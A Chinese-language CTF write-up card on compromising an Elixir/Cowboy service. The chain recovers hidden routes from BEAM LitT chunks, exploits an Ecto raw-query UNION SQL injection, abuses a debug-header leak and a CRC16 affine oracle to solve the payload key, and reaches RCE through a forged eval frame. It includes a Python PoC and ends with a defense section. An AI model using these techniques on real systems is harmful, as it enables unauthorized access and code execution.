---
id: ctf-web-elixir-beam-fpx-crc16-affine-oracle
title: Elixir BEAM 发布包恢复隐藏路由 + Ecto SQLi 与 FPX CRC16 仿射 oracle 到 RCE
type: scenario
domain: ctf
path: ctf/web
technique: beam-release-fpx-crc16-affine-oracle
aliases:
- BEAM LitT 路由恢复
- Ecto raw query SQL 注入
- x-pipeline-debug ETS 泄露
- FPX CRC16 oracle
- CRC 仿射性 GF(2) 解密钥
- xor-rotate 载荷加密
tags:
- ctf
- web
- elixir
- beam
- ecto
- sqli
- crc16
- gf2
- oracle
- fpx
- rce
cve: []
severity: critical
confidence: high
status: verified
created: '2026-11-05'
updated: '2026-11-06'
verification:
  verified_by: verifier-V118
  verified_at: '2026-11-06T01:59:39+08:00'
  notes: 已对照原文核对；BEAM LitT 路由恢复、Ecto 四列 UNION、FPX CRC16/ARC 仿射 oracle 与 GF(2) 解 nonce、read_ets/eval RCE 一致
---

## 一句话结论

Elixir/Cowboy 服务的发布包里藏着 LitT 压缩 ETF 路由表；管道搜索接口把 `status` 直接拼进 Ecto raw query（4 列 UNION、报错回显完整 SQL），可导出管理员 api_key 换 bearer token；调试头泄露 ETS 与 FPX 协议后，利用 FPX 帧“CRC 错误时回显 expected CRC”构造 CRC16 仿射 oracle，在 GF(2) 上解出 128 位 xor-rotate 密钥，最终 `read_ets` 取 erlang_cookie 并 `eval` 执行 `/readflag`。

## 原理

- **发布包恢复路由**：BEAM 文件里的 LitT 分块是 zlib 压缩的 ETF 项，解压/解码后可恢复发布版隐藏路由表（健康检查、GraphQL、管道列表/搜索/导出、认证、调试指标与求值、FPX 握手/命令、实时 WebSocket、v2 管理接口）；其中部分路由是诱饵，真正可用的是管道搜索、认证、调试指标与 FPX 桥接。
- **SQL 注入**：管道搜索把 `status` 直接拼进 Ecto `raw` 查询，可用四列 UNION；数据库以超级用户运行，错误信息回显完整查询语句，因此可直接 UNION 导出 `users` 表拿到管理员 `api_key`，再调用认证接口换 bearer token。
- **调试泄露**：带 `x-pipeline-debug` 请求头访问指标路由会返回 ETS 表内容和 FPX 协议说明，省去盲猜协议。
- **FPX 协议**：帧格式为魔数 `FBAE`、命令字、大端长度、载荷、CRC16；载荷使用 xor-rotate 加密，密钥为 `sha256(erlang_cookie)` 前 16 字节；CRC 为 CRC16/ARC，覆盖命令字、长度与**明文**。
- **CRC oracle**：发送长度为 0..16、载荷全 0、CRC 错误的帧，服务端返回 `expected <crc>, got <crc>`。对固定长度 L，CRC 对明文字节是 GF(2) 仿射函数；全 0 载荷经 xor-rotate 解密后得到密钥字节本身，改变某一明文字节某一位即可得到 CRC 输出的差分列。收集 L=0..17 的 16 位输出，构造 128 个未知位的线性方程组，高斯消元后秩为 128，解出 16 字节 nonce/密钥。
- **RCE**：有了密钥即可伪造合法帧；`read_ets` 读取 `pipeline_secrets` 得到 `erlang_cookie`，再用 `eval` 命令执行 `System.cmd("/readflag", [])`，以 root 身份读 flag。

## 触发条件

- 目标为 Elixir/Plug/Cowboy 发布包，且发布包未剥离 BEAM 调试信息（LitT 可恢复路由）。
- 存在把用户输入拼进 Ecto `raw`/`fragment` 的接口，且错误信息回显 SQL。
- 数据库账号权限过高（本例超级用户），`users` 表存有可用 api_key。
- 调试指标路由可通过 `x-pipeline-debug` 头访问，泄露 ETS/协议。
- FPX 命令接口接受攻击者构造的帧，且在 CRC 不匹配时回显期望 CRC（把校验器变成 oracle）。
- 服务端执行 `eval`/`System.cmd` 或等价动态求值能力；`/readflag` 为 setuid root。

## 利用步骤

1. 解包 release，提取 BEAM，定位 LitT 分块，zlib 解压后按 ETF 解析，恢复隐藏路由与协议常量。
2. 对管道搜索接口测试 `status` 注入：`' UNION SELECT NULL,...--` 逐步凑四列；利用报错回显确认查询结构。
3. UNION 导出 `users`，取管理员 `api_key`；`POST /api/v1/auth {"api_key": ...}` 换 bearer token。
4. `POST /api/v1/fpx/handshake` 拿 `session_id`；带 `x-pipeline-debug` 访问指标路由，记录 ETS 内容与 FPX 帧格式。
5. 对 L=0..16 发送 `frame(cmd=1, payload=b"\x00"*L, crc=0)`，正则提取 `expected` CRC；按 CRC 的仿射性建立方程，解 128 位密钥（nonce）。
6. 用密钥伪造 `cmd=2, payload="pipeline_secrets"` 的 `read_ets` 帧，取 `erlang_cookie`。
7. 伪造 `cmd=4, payload=cookie + "|" + "System.cmd(\"/readflag\", [])"` 的 `eval` 帧，读取命令输出。

## PoC

```python
import http.client, json, re, struct

HOST, PORT = "target", 27838
API_KEY = "<admin_api_key>"

def req(method, path, body=None, headers=None):
    c = http.client.HTTPConnection(HOST, PORT, timeout=15)
    h = dict(headers or {})
    if body is not None:
        h.setdefault("Content-Type", "application/json")
    c.request(method, path, body, h)
    r = c.getresponse(); d = r.read(); c.close()
    return r.status, d

def login():
    st, d = req("POST", "/api/v1/auth", json.dumps({"api_key": API_KEY}))
    return json.loads(d)["token"]

def handshake(token):
    st, d = req("POST", "/api/v1/fpx/handshake", "{}", {"Authorization": "Bearer " + token})
    return json.loads(d)["session_id"]

def frame(cmd, payload, crc=0):
    return bytes([0xFB, 0xAE, cmd]) + len(payload).to_bytes(2, "big") + payload + crc.to_bytes(2, "big")

def oracle(token, sid, L):
    body = json.dumps({"session_id": sid, "frame": frame(1, b"\x00" * L).hex()})
    st, d = req("POST", "/api/v1/fpx/command", body, {"Authorization": "Bearer " + token})
    m = re.search(rb"expected ([0-9A-Fa-f]+), got ([0-9A-Fa-f]+)", d)
    return int(m.group(1), 16), int(m.group(2), 16)

# CRC16/ARC：poly 0xA001，init 0xFFFF，覆盖 cmd||len||plaintext
def crc16(data):
    crc = 0xFFFF
    for b in data:
        crc ^= b
        for _ in range(8):
            crc = (crc >> 1) ^ 0xA001 if crc & 1 else crc >> 1
    return crc & 0xFFFF

def solve_nonce(obs):
    # 对每个 L，f(L, x)=crc16(bytes([1])+L.to_bytes(2,'big')+x[:L])
    # 列 = f(L, e_j) ^ f(L, 0)；未知量为 128 位密钥
    rows = []
    for L, y in obs.items():
        c0 = crc16(bytes([1]) + L.to_bytes(2, "big") + bytes(L))
        cols = []
        for j in range(128):
            e = [0] * L
            if j // 8 < L:
                e[j // 8] = 1 << (j % 8)
            cols.append(crc16(bytes([1]) + L.to_bytes(2, "big") + bytes(e)) ^ c0)
        for bit in range(16):
            coef = 0
            for j in range(128):
                if (cols[j] >> bit) & 1:
                    coef |= 1 << j
            rows.append((coef, ((y >> bit) & 1) ^ ((c0 >> bit) & 1)))
    pivots = {}
    for coef, rhs in rows:
        while coef:
            p = coef.bit_length() - 1
            if p in pivots:
                pc, pr = pivots[p]; coef ^= pc; rhs ^= pr
            else:
                pivots[p] = (coef, rhs); break
        else:
            assert rhs == 0
    # 回代求特解（秩 128 时唯一）
    sol = 0
    mat = [[c, r] for c, r in pivots.values()]
    for i in range(len(mat)):
        p = mat[i][0].bit_length() - 1
        for j in range(len(mat)):
            if i != j and ((mat[j][0] >> p) & 1):
                mat[j][0] ^= mat[i][0]; mat[j][1] ^= mat[i][1]
    for coef, rhs in mat:
        p = coef.bit_length() - 1
        if coef == (1 << p) and rhs:
            sol |= 1 << p
    return bytes((sol >> (8 * i)) & 0xFF for i in range(16))
```

拿到 nonce 后按 `rotl(p ^ key[i % 16], i % 8)` 加密载荷、重新计算明文 CRC，即可构造 `read_ets`/`eval` 帧。

## 变体与关联

- 同源发布包可能把路由表放在其他 BEAM chunk（AtU8/Code/LitT），可用 `beam_lib`/`erts_debug` 或自定义 ETF 解析恢复。
- CRC oracle 不限于 FPX：任何“校验失败返回期望校验值”的协议都可按同样思路恢复仿射密钥；若 CRC 覆盖范围不含长度，方程组更简单。
- SQL 注入点可能在 `fragment`、`Ecto.Adapters.SQL.query`、`Repo.query` 等；报错回显是加速器，没有回显时可用盲注。
- 关联：通用 SQLi、Ecto/Elixir 安全、CRC/线性代数侧信道类卡片。

## 检测与防御

- 管道搜索等接口使用参数化查询（`^`/`fragment` 占位符），禁止把 `status` 拼进 SQL；生产数据库账号最小权限；关闭 SQL 错误回显。
- 移除 `x-pipeline-debug` 等调试头与 eval/read_ets 接口；发布包剥离调试信息、限制 BEAM 下载。
- FPX 载荷加 MAC（HMAC）而不是只依赖 CRC；CRC 校验失败时只返回统一错误，不回显期望值；密钥不要用 `erlang_cookie` 派生，定期轮换。
- 检测：`x-pipeline-debug` 请求、指标路由异常访问、SQL 报错中出现 UNION/SELECT、FPX 帧长度 0..17 的连续 CRC 失败、`read_ets`/`eval` 命令调用。
